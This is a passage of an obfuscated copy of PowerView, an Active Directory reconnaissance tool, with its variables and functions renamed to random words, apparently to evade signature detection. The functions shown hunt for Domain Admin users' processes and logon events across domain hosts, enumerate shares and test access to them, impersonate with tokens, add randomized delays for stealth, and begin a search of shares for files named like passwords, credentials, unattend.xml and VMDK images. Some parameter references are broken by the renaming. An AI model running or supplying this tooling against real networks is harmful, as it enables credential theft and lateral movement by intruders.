    PROCESS {
        if ($PSBoundParameters['Delay'] -or $PSBoundParameters['StopOnSuccess']) {
            Write-Verbose "[drinkers] Total number of hosts: $($EqAZlVKw99.count)"
            Write-Verbose "[drinkers] Delay: $Delay, Jitter: $ohvTlzbv99"
            $zLofmUyR99 = 0
            $ZqgWUqYA99 = New-Object System.Random
            ForEach ($BumNVGRu99 in $EqAZlVKw99) {
                $zLofmUyR99 = $zLofmUyR99 + 1
                Start-Sleep -Seconds $ZqgWUqYA99.Next((1-$ohvTlzbv99)*$Delay, (1+$ohvTlzbv99)*$Delay)
                Write-Verbose "[drinkers] Enumerating server $cXOPCAwl99 ($zLofmUyR99 of $($EqAZlVKw99.Count))"
                Invoke-Command -ScriptBlock $kEgRxIzp99 -ArgumentList $BumNVGRu99, $eKjwQtUM99, $DAmvjFbJ99, $QDuWiWQb99, $WUqPycDr99
                if ($fYOedlSN99 -and $DCpfKYOf99) {
                    Write-Verbose "[drinkers] Target user found, returning early"
                    return
                }
            }
        }
        else {
            Write-Verbose "[drinkers] Using threading with threads: $wCkPnMUb99"
            Write-Verbose "[drinkers] TargetComputers length: $($EqAZlVKw99.Length)"
            $qczwSIpm99 = @{
                'TargetUsers' = $eKjwQtUM99
                'CurrentUser' = $DAmvjFbJ99
                'Stealth' = $QDuWiWQb99
                'TokenHandle' = $WUqPycDr99
            }
            glorious -ComputerName $EqAZlVKw99 -ScriptBlock $kEgRxIzp99 -ScriptParameters $qczwSIpm99 -Threads $wCkPnMUb99
        }
    }
    END {
        if ($WUqPycDr99) {
            Nina -TokenHandle $WUqPycDr99
        }
    }
}
function snowshed {
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSUsePSCredentialType', '')]
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSAvoidUsingPlainTextForPassword', '')]
    [OutputType('PowerView.UserProcess')]
    [CmdletBinding(DefaultParameterSetName = 'None')]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('DNSHostName')]
        [String[]]
        $VrEmrUHq99,
        [ValidateNotNullOrEmpty()]
        [String]
        $SSNUOPgW99,
        [ValidateNotNullOrEmpty()]
        [String]
        $cdytPdAI99,
        [ValidateNotNullOrEmpty()]
        [String]
        $glLCVedN99,
        [ValidateNotNullOrEmpty()]
        [String]
        $WrwfvIMy99,
        [Alias('Unconstrained')]
        [Switch]
        $MyERHgGv99,
        [ValidateNotNullOrEmpty()]
        [Alias('OperatingSystem')]
        [String]
        $fGipudMB99,
        [ValidateNotNullOrEmpty()]
        [Alias('ServicePack')]
        [String]
        $JKXRZnBu99,
        [ValidateNotNullOrEmpty()]
        [Alias('SiteName')]
        [String]
        $GtxmnElz99,
        [Parameter(ParameterSetName = 'TargetProcess')]
        [ValidateNotNullOrEmpty()]
        [String[]]
        $lQNcEWQV99,
        [Parameter(ParameterSetName = 'TargetUser')]
        [Parameter(ParameterSetName = 'UserIdentity')]
        [ValidateNotNullOrEmpty()]
        [String[]]
        $rqcypngr99,
        [Parameter(ParameterSetName = 'TargetUser')]
        [ValidateNotNullOrEmpty()]
        [String]
        $ojqqfkye99,
        [Parameter(ParameterSetName = 'TargetUser')]
        [ValidateNotNullOrEmpty()]
        [String]
        $VlBmNldu99,
        [Parameter(ParameterSetName = 'TargetUser')]
        [ValidateNotNullOrEmpty()]
        [String]
        $IXFyKHnF99,
        [ValidateNotNullOrEmpty()]
        [Alias('GroupName', 'Group')]
        [String[]]
        $ZgtvBxHU99 = 'Domain Admins',
        [Parameter(ParameterSetName = 'TargetUser')]
        [Alias('AdminCount')]
        [Switch]
        $tUgZHPlx99,
        [ValidateNotNullOrEmpty()]
        [Alias('DomainController')]
        [String]
        $mSxqoOjK99,
        [ValidateSet('Base', 'OneLevel', 'Subtree')]
        [String]
        $vaSWXjPs99 = 'Subtree',
        [ValidateRange(1, 10000)]
        [Int]
        $mhcqrrQn99 = 200,
        [ValidateRange(1, 10000)]
        [Int]
        $mvTbAWDU99,
        [Switch]
        $rPozaKft99,
        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $gxazvivN99 = [Management.Automation.PSCredential]::Empty,
        [Switch]
        $DCpfKYOf99,
        [ValidateRange(1, 10000)]
        [Int]
        $Delay = 0,
        [ValidateRange(0.0, 1.0)]
        [Double]
        $ohvTlzbv99 = .3,
        [Int]
        [ValidateRange(1, 100)]
        $wCkPnMUb99 = 20
    )
    BEGIN {
        $tgaaoeGR99 = @{
            'Properties' = 'dnshostname'
        }
        if ($PSBoundParameters['Domain']) { $tgaaoeGR99['Domain'] = $SSNUOPgW99 }
        if ($PSBoundParameters['ComputerDomain']) { $tgaaoeGR99['Domain'] = $cdytPdAI99 }
        if ($PSBoundParameters['ComputerLDAPFilter']) { $tgaaoeGR99['LDAPFilter'] = $glLCVedN99 }
        if ($PSBoundParameters['ComputerSearchBase']) { $tgaaoeGR99['SearchBase'] = $WrwfvIMy99 }
        if ($PSBoundParameters['Unconstrained']) { $tgaaoeGR99['Unconstrained'] = $DZNONYED99 }
        if ($PSBoundParameters['ComputerOperatingSystem']) { $tgaaoeGR99['OperatingSystem'] = $wSsSBiPZ99 }
        if ($PSBoundParameters['ComputerServicePack']) { $tgaaoeGR99['ServicePack'] = $qoqQUCpy99 }
        if ($PSBoundParameters['ComputerSiteName']) { $tgaaoeGR99['SiteName'] = $nqApdsmI99 }
        if ($PSBoundParameters['Server']) { $tgaaoeGR99['Server'] = $mSxqoOjK99 }
        if ($PSBoundParameters['SearchScope']) { $tgaaoeGR99['SearchScope'] = $vaSWXjPs99 }
        if ($PSBoundParameters['ResultPageSize']) { $tgaaoeGR99['ResultPageSize'] = $mhcqrrQn99 }
        if ($PSBoundParameters['ServerTimeLimit']) { $tgaaoeGR99['ServerTimeLimit'] = $mvTbAWDU99 }
        if ($PSBoundParameters['Tombstone']) { $tgaaoeGR99['Tombstone'] = $rPozaKft99 }
        if ($PSBoundParameters['Credential']) { $tgaaoeGR99['Credential'] = $gxazvivN99 }
        $xUaDkcfD99 = @{
            'Properties' = 'samaccountname'
        }
        if ($PSBoundParameters['UserIdentity']) { $xUaDkcfD99['Identity'] = $rqcypngr99 }
        if ($PSBoundParameters['Domain']) { $xUaDkcfD99['Domain'] = $SSNUOPgW99 }
        if ($PSBoundParameters['UserDomain']) { $xUaDkcfD99['Domain'] = $ojqqfkye99 }
        if ($PSBoundParameters['UserLDAPFilter']) { $xUaDkcfD99['LDAPFilter'] = $VlBmNldu99 }
        if ($PSBoundParameters['UserSearchBase']) { $xUaDkcfD99['SearchBase'] = $IXFyKHnF99 }
        if ($PSBoundParameters['UserAdminCount']) { $xUaDkcfD99['AdminCount'] = $tUgZHPlx99 }
        if ($PSBoundParameters['Server']) { $xUaDkcfD99['Server'] = $mSxqoOjK99 }
        if ($PSBoundParameters['SearchScope']) { $xUaDkcfD99['SearchScope'] = $vaSWXjPs99 }
        if ($PSBoundParameters['ResultPageSize']) { $xUaDkcfD99['ResultPageSize'] = $mhcqrrQn99 }
        if ($PSBoundParameters['ServerTimeLimit']) { $xUaDkcfD99['ServerTimeLimit'] = $mvTbAWDU99 }
        if ($PSBoundParameters['Tombstone']) { $xUaDkcfD99['Tombstone'] = $rPozaKft99 }
        if ($PSBoundParameters['Credential']) { $xUaDkcfD99['Credential'] = $gxazvivN99 }
        if ($PSBoundParameters['ComputerName']) {
            $EqAZlVKw99 = $VrEmrUHq99
        }
        else {
            Write-Verbose '[snowshed] Querying computers in the domain'
            $EqAZlVKw99 = doubtlessly @ComputerSearcherArguments | Select-Object -ExpandProperty dnshostname
        }
        Write-Verbose "[snowshed] TargetComputers length: $($EqAZlVKw99.Length)"
        if ($EqAZlVKw99.Length -eq 0) {
            throw '[snowshed] No hosts found to enumerate'
        }
        if ($PSBoundParameters['ProcessName']) {
            $lxBngDbp99 = @()
            ForEach ($T in $lQNcEWQV99) {
                $lxBngDbp99 += $T.Split(',')
            }
            if ($lxBngDbp99 -isnot [System.Array]) {
                $lxBngDbp99 = [String[]] @($lxBngDbp99)
            }
        }
        elseif ($PSBoundParameters['UserIdentity'] -or $PSBoundParameters['UserLDAPFilter'] -or $PSBoundParameters['UserSearchBase'] -or $PSBoundParameters['UserAdminCount'] -or $PSBoundParameters['UserAllowDelegation']) {
            $eKjwQtUM99 = township @UserSearcherArguments | Select-Object -ExpandProperty samaccountname
        }
        else {
            $YREeWdxN99 = @{
                'Identity' = $ZgtvBxHU99
                'Recurse' = $True
            }
            if ($PSBoundParameters['UserDomain']) { $YREeWdxN99['Domain'] = $ojqqfkye99 }
            if ($PSBoundParameters['UserSearchBase']) { $YREeWdxN99['SearchBase'] = $IXFyKHnF99 }
            if ($PSBoundParameters['Server']) { $YREeWdxN99['Server'] = $mSxqoOjK99 }
            if ($PSBoundParameters['SearchScope']) { $YREeWdxN99['SearchScope'] = $vaSWXjPs99 }
            if ($PSBoundParameters['ResultPageSize']) { $YREeWdxN99['ResultPageSize'] = $mhcqrrQn99 }
            if ($PSBoundParameters['ServerTimeLimit']) { $YREeWdxN99['ServerTimeLimit'] = $mvTbAWDU99 }
            if ($PSBoundParameters['Tombstone']) { $YREeWdxN99['Tombstone'] = $rPozaKft99 }
            if ($PSBoundParameters['Credential']) { $YREeWdxN99['Credential'] = $gxazvivN99 }
            $YREeWdxN99
            $eKjwQtUM99 = strippers @GroupSearcherArguments | Select-Object -ExpandProperty MemberName
        }
        $kEgRxIzp99 = {
            Param($VrEmrUHq99, $lQNcEWQV99, $eKjwQtUM99, $gxazvivN99)
            ForEach ($BumNVGRu99 in $VrEmrUHq99) {
                $Up = Test-Connection -Count 1 -Quiet -ComputerName $BumNVGRu99
                if ($Up) {
                    if ($gxazvivN99) {
                        $KpPXKisT99 = console -Credential $gxazvivN99 -ComputerName $BumNVGRu99 -ErrorAction SilentlyContinue
                    }
                    else {
                        $KpPXKisT99 = console -ComputerName $BumNVGRu99 -ErrorAction SilentlyContinue
                    }
                    ForEach ($oRjANeVM99 in $KpPXKisT99) {
                        if ($lQNcEWQV99) {
                            if ($lQNcEWQV99 -Contains $oRjANeVM99.ProcessName) {
                                $oRjANeVM99
                            }
                        }
                        elseif ($eKjwQtUM99 -Contains $oRjANeVM99.User) {
                            $oRjANeVM99
                        }
                    }
                }
            }
        }
    }
    PROCESS {
        if ($PSBoundParameters['Delay'] -or $PSBoundParameters['StopOnSuccess']) {
            Write-Verbose "[snowshed] Total number of hosts: $($EqAZlVKw99.count)"
            Write-Verbose "[snowshed] Delay: $Delay, Jitter: $ohvTlzbv99"
            $zLofmUyR99 = 0
            $ZqgWUqYA99 = New-Object System.Random
            ForEach ($BumNVGRu99 in $EqAZlVKw99) {
                $zLofmUyR99 = $zLofmUyR99 + 1
                Start-Sleep -Seconds $ZqgWUqYA99.Next((1-$ohvTlzbv99)*$Delay, (1+$ohvTlzbv99)*$Delay)
                Write-Verbose "[snowshed] Enumerating server $BumNVGRu99 ($zLofmUyR99 of $($EqAZlVKw99.count))"
                $fYOedlSN99 = Invoke-Command -ScriptBlock $kEgRxIzp99 -ArgumentList $BumNVGRu99, $lxBngDbp99, $eKjwQtUM99, $gxazvivN99
                $fYOedlSN99
                if ($fYOedlSN99 -and $DCpfKYOf99) {
                    Write-Verbose "[snowshed] Target user found, returning early"
                    return
                }
            }
        }
        else {
            Write-Verbose "[snowshed] Using threading with threads: $wCkPnMUb99"
            $qczwSIpm99 = @{
                'ProcessName' = $lxBngDbp99
                'TargetUsers' = $eKjwQtUM99
                'Credential' = $gxazvivN99
            }
            glorious -ComputerName $EqAZlVKw99 -ScriptBlock $kEgRxIzp99 -ScriptParameters $qczwSIpm99 -Threads $wCkPnMUb99
        }
    }
}
function Valkyries {
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSUseDeclaredVarsMoreThanAssignments', '')]
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSUsePSCredentialType', '')]
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSAvoidUsingPlainTextForPassword', '')]
    [OutputType('PowerView.LogonEvent')]
    [OutputType('PowerView.ExplicitCredentialLogon')]
    [CmdletBinding(DefaultParameterSetName = 'Domain')]
    Param(
        [Parameter(ParameterSetName = 'ComputerName', Position = 0, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('dnshostname', 'HostName', 'name')]
        [ValidateNotNullOrEmpty()]
        [String[]]
        $VrEmrUHq99,
        [Parameter(ParameterSetName = 'Domain')]
        [ValidateNotNullOrEmpty()]
        [String]
        $SSNUOPgW99,
        [ValidateNotNullOrEmpty()]
        [Hashtable]
        $kXbEpVCq99,
        [Parameter(ValueFromPipelineByPropertyName = $True)]
        [ValidateNotNullOrEmpty()]
        [DateTime]
        $CtVXbzbF99 = [DateTime]::Now.AddDays(-1),
        [Parameter(ValueFromPipelineByPropertyName = $True)]
        [ValidateNotNullOrEmpty()]
        [DateTime]
        $FVDtcdtR99 = [DateTime]::Now,
        [ValidateRange(1, 1000000)]
        [Int]
        $OoLNhUlP99 = 5000,
        [ValidateNotNullOrEmpty()]
        [String[]]
        $rqcypngr99,
        [ValidateNotNullOrEmpty()]
        [String]
        $ojqqfkye99,
        [ValidateNotNullOrEmpty()]
        [String]
        $VlBmNldu99,
        [ValidateNotNullOrEmpty()]
        [String]
        $IXFyKHnF99,
        [ValidateNotNullOrEmpty()]
        [Alias('GroupName', 'Group')]
        [String[]]
        $ZgtvBxHU99 = 'Domain Admins',
        [Alias('AdminCount')]
        [Switch]
        $tUgZHPlx99,
        [Switch]
        $fXeDJWKC99,
        [ValidateNotNullOrEmpty()]
        [Alias('DomainController')]
        [String]
        $mSxqoOjK99,
        [ValidateSet('Base', 'OneLevel', 'Subtree')]
        [String]
        $vaSWXjPs99 = 'Subtree',
        [ValidateRange(1, 10000)]
        [Int]
        $mhcqrrQn99 = 200,
        [ValidateRange(1, 10000)]
        [Int]
        $mvTbAWDU99,
        [Switch]
        $rPozaKft99,
        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $gxazvivN99 = [Management.Automation.PSCredential]::Empty,
        [Switch]
        $DCpfKYOf99,
        [ValidateRange(1, 10000)]
        [Int]
        $Delay = 0,
        [ValidateRange(0.0, 1.0)]
        [Double]
        $ohvTlzbv99 = .3,
        [Int]
        [ValidateRange(1, 100)]
        $wCkPnMUb99 = 20
    )
    BEGIN {
        $xUaDkcfD99 = @{
            'Properties' = 'samaccountname'
        }
        if ($PSBoundParameters['UserIdentity']) { $xUaDkcfD99['Identity'] = $rqcypngr99 }
        if ($PSBoundParameters['UserDomain']) { $xUaDkcfD99['Domain'] = $ojqqfkye99 }
        if ($PSBoundParameters['UserLDAPFilter']) { $xUaDkcfD99['LDAPFilter'] = $VlBmNldu99 }
        if ($PSBoundParameters['UserSearchBase']) { $xUaDkcfD99['SearchBase'] = $IXFyKHnF99 }
        if ($PSBoundParameters['UserAdminCount']) { $xUaDkcfD99['AdminCount'] = $tUgZHPlx99 }
        if ($PSBoundParameters['Server']) { $xUaDkcfD99['Server'] = $mSxqoOjK99 }
        if ($PSBoundParameters['SearchScope']) { $xUaDkcfD99['SearchScope'] = $vaSWXjPs99 }
        if ($PSBoundParameters['ResultPageSize']) { $xUaDkcfD99['ResultPageSize'] = $mhcqrrQn99 }
        if ($PSBoundParameters['ServerTimeLimit']) { $xUaDkcfD99['ServerTimeLimit'] = $mvTbAWDU99 }
        if ($PSBoundParameters['Tombstone']) { $xUaDkcfD99['Tombstone'] = $rPozaKft99 }
        if ($PSBoundParameters['Credential']) { $xUaDkcfD99['Credential'] = $gxazvivN99 }
        if ($PSBoundParameters['UserIdentity'] -or $PSBoundParameters['UserLDAPFilter'] -or $PSBoundParameters['UserSearchBase'] -or $PSBoundParameters['UserAdminCount']) {
            $eKjwQtUM99 = township @UserSearcherArguments | Select-Object -ExpandProperty samaccountname
        }
        elseif ($PSBoundParameters['UserGroupIdentity'] -or (-not $PSBoundParameters['Filter'])) {
            $YREeWdxN99 = @{
                'Identity' = $ZgtvBxHU99
                'Recurse' = $True
            }
            Write-Verbose "UserGroupIdentity: $ZgtvBxHU99"
            if ($PSBoundParameters['UserDomain']) { $YREeWdxN99['Domain'] = $ojqqfkye99 }
            if ($PSBoundParameters['UserSearchBase']) { $YREeWdxN99['SearchBase'] = $IXFyKHnF99 }
            if ($PSBoundParameters['Server']) { $YREeWdxN99['Server'] = $mSxqoOjK99 }
            if ($PSBoundParameters['SearchScope']) { $YREeWdxN99['SearchScope'] = $vaSWXjPs99 }
            if ($PSBoundParameters['ResultPageSize']) { $YREeWdxN99['ResultPageSize'] = $mhcqrrQn99 }
            if ($PSBoundParameters['ServerTimeLimit']) { $YREeWdxN99['ServerTimeLimit'] = $mvTbAWDU99 }
            if ($PSBoundParameters['Tombstone']) { $YREeWdxN99['Tombstone'] = $rPozaKft99 }
            if ($PSBoundParameters['Credential']) { $YREeWdxN99['Credential'] = $gxazvivN99 }
            $eKjwQtUM99 = strippers @GroupSearcherArguments | Select-Object -ExpandProperty MemberName
        }
        if ($PSBoundParameters['ComputerName']) {
            $EqAZlVKw99 = $VrEmrUHq99
        }
        else {
            $zIQySoxi99 = @{
                'LDAP' = $True
            }
            if ($PSBoundParameters['Domain']) { $zIQySoxi99['Domain'] = $SSNUOPgW99 }
            if ($PSBoundParameters['Server']) { $zIQySoxi99['Server'] = $mSxqoOjK99 }
            if ($PSBoundParameters['Credential']) { $zIQySoxi99['Credential'] = $gxazvivN99 }
            Write-Verbose "[Valkyries] Querying for domain controllers in domain: $SSNUOPgW99"
            $EqAZlVKw99 = deplorably @DCSearcherArguments | Select-Object -ExpandProperty dnshostname
        }
        if ($EqAZlVKw99 -and ($EqAZlVKw99 -isnot [System.Array])) {
            $EqAZlVKw99 = @(,$EqAZlVKw99)
        }
        Write-Verbose "[Valkyries] TargetComputers length: $($EqAZlVKw99.Length)"
        Write-Verbose "[Valkyries] TargetComputers $EqAZlVKw99"
        if ($EqAZlVKw99.Length -eq 0) {
            throw '[Valkyries] No hosts found to enumerate'
        }
        $kEgRxIzp99 = {
            Param($VrEmrUHq99, $CtVXbzbF99, $FVDtcdtR99, $OoLNhUlP99, $eKjwQtUM99, $kXbEpVCq99, $gxazvivN99)
            ForEach ($BumNVGRu99 in $VrEmrUHq99) {
                $Up = Test-Connection -Count 1 -Quiet -ComputerName $BumNVGRu99
                if ($Up) {
                    $WacrwYam99 = @{
                        'ComputerName' = $BumNVGRu99
                    }
                    if ($CtVXbzbF99) { $WacrwYam99['StartTime'] = $CtVXbzbF99 }
                    if ($FVDtcdtR99) { $WacrwYam99['EndTime'] = $FVDtcdtR99 }
                    if ($OoLNhUlP99) { $WacrwYam99['MaxEvents'] = $OoLNhUlP99 }
                    if ($gxazvivN99) { $WacrwYam99['Credential'] = $gxazvivN99 }
                    if ($kXbEpVCq99 -or $eKjwQtUM99) {
                        if ($eKjwQtUM99) {
                            niftiest @DomainUserEventArgs | Where-Object {$eKjwQtUM99 -contains $_.TargetUserName}
                        }
                        else {
                            $pYHImtAf99 = 'or'
                            $kXbEpVCq99.Keys | ForEach-Object {
                                if (($_ -eq 'Op') -or ($_ -eq 'Operator') -or ($_ -eq 'Operation')) {
                                    if (($kXbEpVCq99[$_] -match '&') -or ($kXbEpVCq99[$_] -eq 'and')) {
                                        $pYHImtAf99 = 'and'
                                    }
                                }
                            }
                            $Keys = $kXbEpVCq99.Keys | Where-Object {($_ -ne 'Op') -and ($_ -ne 'Operator') -and ($_ -ne 'Operation')}
                            niftiest @DomainUserEventArgs | ForEach-Object {
                                if ($pYHImtAf99 -eq 'or') {
                                    ForEach ($Key in $Keys) {
                                        if ($_."$Key" -match $kXbEpVCq99[$Key]) {
                                            $_
                                        }
                                    }
                                }
                                else {
                                    ForEach ($Key in $Keys) {
                                        if ($_."$Key" -notmatch $kXbEpVCq99[$Key]) {
                                            break
                                        }
                                        $_
                                    }
                                }
                            }
                        }
                    }
                    else {
                        niftiest @DomainUserEventArgs
                    }
                }
            }
        }
    }
    PROCESS {
        if ($PSBoundParameters['Delay'] -or $PSBoundParameters['StopOnSuccess']) {
            Write-Verbose "[Valkyries] Total number of hosts: $($EqAZlVKw99.count)"
            Write-Verbose "[Valkyries] Delay: $Delay, Jitter: $ohvTlzbv99"
            $zLofmUyR99 = 0
            $ZqgWUqYA99 = New-Object System.Random
            ForEach ($BumNVGRu99 in $EqAZlVKw99) {
                $zLofmUyR99 = $zLofmUyR99 + 1
                Start-Sleep -Seconds $ZqgWUqYA99.Next((1-$ohvTlzbv99)*$Delay, (1+$ohvTlzbv99)*$Delay)
                Write-Verbose "[Valkyries] Enumerating server $BumNVGRu99 ($zLofmUyR99 of $($EqAZlVKw99.count))"
                $fYOedlSN99 = Invoke-Command -ScriptBlock $kEgRxIzp99 -ArgumentList $BumNVGRu99, $CtVXbzbF99, $FVDtcdtR99, $OoLNhUlP99, $eKjwQtUM99, $kXbEpVCq99, $gxazvivN99
                $fYOedlSN99
                if ($fYOedlSN99 -and $DCpfKYOf99) {
                    Write-Verbose "[Valkyries] Target user found, returning early"
                    return
                }
            }
        }
        else {
            Write-Verbose "[Valkyries] Using threading with threads: $wCkPnMUb99"
            $qczwSIpm99 = @{
                'StartTime' = $CtVXbzbF99
                'EndTime' = $FVDtcdtR99
                'MaxEvents' = $OoLNhUlP99
                'TargetUsers' = $eKjwQtUM99
                'Filter' = $kXbEpVCq99
                'Credential' = $gxazvivN99
            }
            glorious -ComputerName $EqAZlVKw99 -ScriptBlock $kEgRxIzp99 -ScriptParameters $qczwSIpm99 -Threads $wCkPnMUb99
        }
    }
}
function Suwanee {
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType('PowerView.ShareInfo')]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('DNSHostName')]
        [String[]]
        $VrEmrUHq99,
        [ValidateNotNullOrEmpty()]
        [Alias('Domain')]
        [String]
        $cdytPdAI99,
        [ValidateNotNullOrEmpty()]
        [String]
        $glLCVedN99,
        [ValidateNotNullOrEmpty()]
        [String]
        $WrwfvIMy99,
        [ValidateNotNullOrEmpty()]
        [Alias('OperatingSystem')]
        [String]
        $fGipudMB99,
        [ValidateNotNullOrEmpty()]
        [Alias('ServicePack')]
        [String]
        $JKXRZnBu99,
        [ValidateNotNullOrEmpty()]
        [Alias('SiteName')]
        [String]
        $GtxmnElz99,
        [Alias('CheckAccess')]
        [Switch]
        $nvVkzIIC99,
        [ValidateNotNullOrEmpty()]
        [Alias('DomainController')]
        [String]
        $mSxqoOjK99,
        [ValidateSet('Base', 'OneLevel', 'Subtree')]
        [String]
        $vaSWXjPs99 = 'Subtree',
        [ValidateRange(1, 10000)]
        [Int]
        $mhcqrrQn99 = 200,
        [ValidateRange(1, 10000)]
        [Int]
        $mvTbAWDU99,
        [Switch]
        $rPozaKft99,
        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $gxazvivN99 = [Management.Automation.PSCredential]::Empty,
        [ValidateRange(1, 10000)]
        [Int]
        $Delay = 0,
        [ValidateRange(0.0, 1.0)]
        [Double]
        $ohvTlzbv99 = .3,
        [Int]
        [ValidateRange(1, 100)]
        $wCkPnMUb99 = 20
    )
    BEGIN {
        $tgaaoeGR99 = @{
            'Properties' = 'dnshostname'
        }
        if ($PSBoundParameters['ComputerDomain']) { $tgaaoeGR99['Domain'] = $cdytPdAI99 }
        if ($PSBoundParameters['ComputerLDAPFilter']) { $tgaaoeGR99['LDAPFilter'] = $glLCVedN99 }
        if ($PSBoundParameters['ComputerSearchBase']) { $tgaaoeGR99['SearchBase'] = $WrwfvIMy99 }
        if ($PSBoundParameters['Unconstrained']) { $tgaaoeGR99['Unconstrained'] = $DZNONYED99 }
        if ($PSBoundParameters['ComputerOperatingSystem']) { $tgaaoeGR99['OperatingSystem'] = $wSsSBiPZ99 }
        if ($PSBoundParameters['ComputerServicePack']) { $tgaaoeGR99['ServicePack'] = $qoqQUCpy99 }
        if ($PSBoundParameters['ComputerSiteName']) { $tgaaoeGR99['SiteName'] = $nqApdsmI99 }
        if ($PSBoundParameters['Server']) { $tgaaoeGR99['Server'] = $mSxqoOjK99 }
        if ($PSBoundParameters['SearchScope']) { $tgaaoeGR99['SearchScope'] = $vaSWXjPs99 }
        if ($PSBoundParameters['ResultPageSize']) { $tgaaoeGR99['ResultPageSize'] = $mhcqrrQn99 }
        if ($PSBoundParameters['ServerTimeLimit']) { $tgaaoeGR99['ServerTimeLimit'] = $mvTbAWDU99 }
        if ($PSBoundParameters['Tombstone']) { $tgaaoeGR99['Tombstone'] = $rPozaKft99 }
        if ($PSBoundParameters['Credential']) { $tgaaoeGR99['Credential'] = $gxazvivN99 }
        if ($PSBoundParameters['ComputerName']) {
            $EqAZlVKw99 = $VrEmrUHq99
        }
        else {
            Write-Verbose '[Suwanee] Querying computers in the domain'
            $EqAZlVKw99 = doubtlessly @ComputerSearcherArguments | Select-Object -ExpandProperty dnshostname
        }
        Write-Verbose "[Suwanee] TargetComputers length: $($EqAZlVKw99.Length)"
        if ($EqAZlVKw99.Length -eq 0) {
            throw '[Suwanee] No hosts found to enumerate'
        }
        $kEgRxIzp99 = {
            Param($VrEmrUHq99, $nvVkzIIC99, $BmRRNCwx99)
            if ($BmRRNCwx99) {
                $Null = admonished -TokenHandle $BmRRNCwx99 -Quiet
            }
            ForEach ($BumNVGRu99 in $VrEmrUHq99) {
                $Up = Test-Connection -Count 1 -Quiet -ComputerName $BumNVGRu99
                if ($Up) {
                    $OPByCexH99 = well -ComputerName $BumNVGRu99
                    ForEach ($Share in $OPByCexH99) {
                        $cjvROwQJ99 = $Share.Name
                        $Path = '\\'+$BumNVGRu99+'\'+$cjvROwQJ99
                        if (($cjvROwQJ99) -and ($cjvROwQJ99.trim() -ne '')) {
                            if ($nvVkzIIC99) {
                                try {
                                    $Null = [IO.Directory]::GetFiles($Path)
                                    $Share
                                }
                                catch {
                                    Write-Verbose "Error accessing share path $Path : $_"
                                }
                            }
                            else {
                                $Share
                            }
                        }
                    }
                }
            }
            if ($BmRRNCwx99) {
                Nina
            }
        }
        $WUqPycDr99 = $Null
        if ($PSBoundParameters['Credential']) {
            if ($PSBoundParameters['Delay'] -or $PSBoundParameters['StopOnSuccess']) {
                $WUqPycDr99 = admonished -Credential $gxazvivN99
            }
            else {
                $WUqPycDr99 = admonished -Credential $gxazvivN99 -Quiet
            }
        }
    }
    PROCESS {
        if ($PSBoundParameters['Delay'] -or $PSBoundParameters['StopOnSuccess']) {
            Write-Verbose "[Suwanee] Total number of hosts: $($EqAZlVKw99.count)"
            Write-Verbose "[Suwanee] Delay: $Delay, Jitter: $ohvTlzbv99"
            $zLofmUyR99 = 0
            $ZqgWUqYA99 = New-Object System.Random
            ForEach ($BumNVGRu99 in $EqAZlVKw99) {
                $zLofmUyR99 = $zLofmUyR99 + 1
                Start-Sleep -Seconds $ZqgWUqYA99.Next((1-$ohvTlzbv99)*$Delay, (1+$ohvTlzbv99)*$Delay)
                Write-Verbose "[Suwanee] Enumerating server $BumNVGRu99 ($zLofmUyR99 of $($EqAZlVKw99.count))"
                Invoke-Command -ScriptBlock $kEgRxIzp99 -ArgumentList $BumNVGRu99, $nvVkzIIC99, $WUqPycDr99
            }
        }
        else {
            Write-Verbose "[Suwanee] Using threading with threads: $wCkPnMUb99"
            $qczwSIpm99 = @{
                'CheckShareAccess' = $nvVkzIIC99
                'TokenHandle' = $WUqPycDr99
            }
            glorious -ComputerName $EqAZlVKw99 -ScriptBlock $kEgRxIzp99 -ScriptParameters $qczwSIpm99 -Threads $wCkPnMUb99
        }
    }
    END {
        if ($WUqPycDr99) {
            Nina -TokenHandle $WUqPycDr99
        }
    }
}
function indignantly {
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType('PowerView.FoundFile')]
    [CmdletBinding(DefaultParameterSetName = 'FileSpecification')]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('DNSHostName')]
        [String[]]
        $VrEmrUHq99,
        [ValidateNotNullOrEmpty()]
        [String]
        $cdytPdAI99,
        [ValidateNotNullOrEmpty()]
        [String]
        $glLCVedN99,
        [ValidateNotNullOrEmpty()]
        [String]
        $WrwfvIMy99,
        [ValidateNotNullOrEmpty()]
        [Alias('OperatingSystem')]
        [String]
        $fGipudMB99,
        [ValidateNotNullOrEmpty()]
        [Alias('ServicePack')]
        [String]
        $JKXRZnBu99,
        [ValidateNotNullOrEmpty()]
        [Alias('SiteName')]
        [String]
        $GtxmnElz99,
        [Parameter(ParameterSetName = 'FileSpecification')]
        [ValidateNotNullOrEmpty()]
        [Alias('SearchTerms', 'Terms')]
        [String[]]
        $CuygeMzO99 = @('*password*', '*sensitive*', '*admin*', '*login*', '*secret*', 'unattend*.xml', '*.vmdk', '*creds*', '*credential*', '*.config'),
        [ValidateNotNullOrEmpty()]
        [ValidatePattern('\\\\')]
        [Alias('Share')]
        [String[]]
        $ynlwUfhB99,
        [String[]]
        $OxWrrBbt99 = @('C$', 'Admin$', 'Print$', 'IPC$'),
        [Parameter(ParameterSetName = 'FileSpecification')]
        [ValidateNotNullOrEmpty()]
        [DateTime]
        $uKMZoAej99,
        [Parameter(ParameterSetName = 'FileSpecification')]
        [ValidateNotNullOrEmpty()]
        [DateTime]
        $QRdxeHwL99,
